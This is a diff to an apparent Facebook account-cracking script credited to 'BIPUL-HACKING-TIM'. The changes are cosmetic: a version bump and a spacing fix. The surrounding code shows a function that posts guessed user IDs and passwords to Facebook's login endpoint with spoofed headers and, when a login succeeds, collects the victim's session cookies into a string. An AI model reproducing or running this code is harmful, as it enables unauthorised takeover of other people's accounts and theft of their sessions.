@@ -148,7 +148,7 @@ logo = (f"""
 ╠══[Github                   • \33[1;38mBIPUL-HACKING-TIM ]  \33[1;34m   
 ╠══[Number                  • 01759689717 ]  \33[1;35m 
 ╠══[TOOLS                    • FREE ]          \33[1;32m   
-╠══[VERSION                  • 0.3 ]          \033[1;35m 
+╠══[VERSION                  • 0.4 ]          \033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
@@ -265,7 +265,7 @@ def mumitx(uid,pwx,tl):
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
-            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
